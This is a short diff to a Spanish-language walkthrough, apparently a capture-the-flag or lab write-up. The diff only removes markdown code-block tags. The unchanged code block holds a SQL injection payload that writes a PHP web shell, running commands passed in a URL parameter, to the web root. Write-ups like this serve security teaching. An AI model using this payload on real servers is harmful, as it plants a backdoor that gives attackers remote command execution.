@@ -86,11 +86,10 @@ Bingo! Como podemos ver con una sola **'**, vemos que da un error, por lo cual e
 
 Así quedaría la inyección en la solicitud.
 
-{% code overflow="wrap" %}
 ```
 username=sqli&country=Brazil' union all select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wshell.php" -- -
 ```
-{% endcode %}
+
 
 ![CMD Injection](./3.png)
 
